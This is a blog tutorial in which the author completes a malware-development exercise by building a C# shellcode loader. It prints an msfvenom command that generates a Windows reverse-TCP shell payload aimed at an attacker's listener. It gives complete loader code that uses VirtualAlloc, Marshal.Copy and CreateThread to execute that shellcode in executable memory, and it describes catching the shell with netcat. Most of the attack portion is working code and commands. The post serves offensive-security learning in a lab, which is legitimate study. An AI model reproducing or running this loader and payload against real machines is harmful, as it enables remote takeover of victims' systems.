# A Script Kiddie's First Malware

## Introduction

I came across chvancooten's [Malware Development for Dummies](https://github.com/chvancooten/maldev-for-dummies) repo and thought I would give it a spin.

I decided to go with C# for these exercises but the repo has exercises and tips for C#, Nim, and Golang. I have some experience programming but zero experience programming in C# so this was a nice challenge and opportunity to learn!

## Quick Dev Environment Note

For my development environment, I am using Visual Studio 2019 with the .NET Desktop Development module installed. The .NET module allows us to code in C#. I did most of my coding using the console apps preset. I was having difficulty using Visual Studio 2022 but found the best results using 2019.

I tested my solutions on a VM running Commando but any Windows 10 device with Windows Defender disabled should work too. I am also using a Kali VM to generate shellcode and to host a listener.

## Objective

The objective of the first exercise is to create a basic shellcode loader that will utilize Windows APIs to load our shellcode into memory and execute it. If that all sounds like gibberish, that's ok! Let's go through the basic elements of this shellcode loader step by step so we can make more sense of it.

## Shellcode
Shellcode is usually described as code executed by a target program to grant the attacker a remote shell. This code can essentially let the attacker gain access to a victim's system.

We will be using `msfvenom` to generate shellcode in either a binary or hex format.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=attackerPort -f csharp
```

Switches
* -p specifies the payload. windows/x64/shell_reverse_tcp will give us a reverse shell on x64 based systems.
* LHOST and LPORT specifies the listener's IP and port which will catch the reverse shell.
* -f specifies the format that msfvenom will output the shellcode as. In this case, the shellcode will be in C# syntax.

Below is a snippet of what the output will look like. 
```c#
byte[] shellcode = new byte[380] {0x00,0x00,...};
```
This code is now ready to be copied into our solution.

## Windows API's and P/Invoke

Now that we have learned about and generated our own shellcode, we need to figure out how to load it into memory. We want to execute this code in memory as it decreases the chances that our payload will be detected by antivirus. The techniques we are using in this example will get caught by Windows Defender but learning how to manipulate memory and executing shellcode in it are still good techniques to learn.

Application Programming Interfaces, or API's, are designed to allow different applications to talk to one another and the Windows API is no different. By importing certain API functions into our code, our program can instruct Windows to perform certain tasks.

The slides included in this repo have an incredibly helpful flowchart that describes some of the functions we'll need.
![Shellcode Execution Flow](/assets/images/APISlide.png)

C# and .NET operate in a run-time environment called Common Language Runtime(CLR). CLR manages a lot of the development process for us to make it more convenient for developers. Some of the things CLR manages include memory allocation so, if we wanted to allocate memory on our own, we would need to use functions that aren't managed by CLR. 

Code managed by the CLR are managed code while code not managed by the CLR are aptly named unmanaged code. Our program will be managed by the CLR but to perform a task on our own that is usually managed by CLR, we will need to import functions from unmanaged libraries. This process is known as Platform Invoke or P/Invoke.

According to the slide above, we will need to use the VirtualAlloc() and CreateThread() functions. These functions are included in the kernel32.dll library.

In order perform P/Invoke, we will need to use the System and System.Runtime.InteropServices namespaces. We will declare these namespaces in the beginning of our code.

```c#
using System;
using System.Runtime.InteropServices;
```

We'll then create a new class named "Methods" to import the functions:

```c#
class Methods
{
    //VirtualAlloc API to allocate memory.
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpStartAddr,
        ulong size,
        uint flallocationType,
        uint flProject);

    //CreateThread API to execute our shellcode.
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(
        uint lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr param,
        uint dwCreationFlags,
        ref uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds);
}
```
This might look confusing at first glance but you'll notice that there are a lot of similarities between each function. Each function starts by defining which dll we want to import a function from. You can see this in lines 4, 12, and 21. 

Next, we define the actual function name. In the first function, we specify that we want to import `VirtualAlloc`. Next, we define the values that the function returns. For `VirtualAlloc`, we see that it takes `lpStartAddr`, `size`, `flallocationType`, and `flProject` as values. 

The rest of the functions follow a similar format. We import `CreateThread` so that we can excute the shellcode in memory and we import `WaitForSingleObject`so that we can wait for the thread to exit cleanly. This, and many of the other techniques I will be mentioning were taken from [Matterpreter's blog here](https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d).

You can find a fantastic reference for these functions on [pinvoke.net](https://pinvoke.net/) where you can get the specific syntax you'll need to import whatever function you want.

Some of these functions will take arguments that will need some sort of hexadecimal-esque value but we can use Enumerators, or enums, to assign these values to strings. Let's do add these enums to our Methods class.

```c#
    public enum StateEnum
    {
        MEM_COMMIT = 0x1000,
        MEM_RESERVE = 0x2000,
        MEM_FREE = 0x10000,
    }

    public enum Protection
    {
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
    }
```
Now that these values are set, let's write our main function which will handle the logic of our program.

```c#
namespace ShellcodeLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            //Insert shellcode here.
            //msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=attackerPort -f csharp
            byte[] shellcode = new byte[] { };

            //Set up VirtualAlloc.
            IntPtr funcAddr;

            funcAddr = Methods.VirtualAlloc(
                IntPtr.Zero,
                (ulong)shellcode.Length,
                (uint)Methods.StateEnum.MEM_COMMIT,
                (uint)Methods.Protection.PAGE_EXECUTE_READWRITE);

            //Copy shellcode into memory.
            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);

            //Set up variables that will be used before executing the code.
            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            //Execute the code.
            hThread = Methods.CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            Methods.WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;

        }
    }
}
```

Let's walk through this code.
* Lines 1-6 are necessary syntax for C#
* We define our shellcode that we created using `msfvenom` on line 9.
* Lines 14 to 18 are where we define the `funcAddr` variable and use it to call `VirtualAlloc` to define the required amount of memory for our exploit. Note the `MEM_COMMIT` and `PAGE_EXECUTE_READWRITE` enums.
* We use `Marshal.copy` to copy our shellcode into memory without using API calls.
* Lines 24 to 26 sets up some variables that will be used when we execute our code.
* Lines 29 to 31 will execute the code using `CreateThread` and uses `WaitForSingleObject` to exit the program cleanly.

Alright, lets set up a listener on our Kali machine using Netcat:

Next, we'll run our code on our development machine:

We then catch a reverse shell on our Kali machine!

## Conclusion

In this blog, we learned how to use C# and the Windows API to load and execute shellcode in memory. This will get caught by Defender immediately but it's still a solid foundational skill to learn.
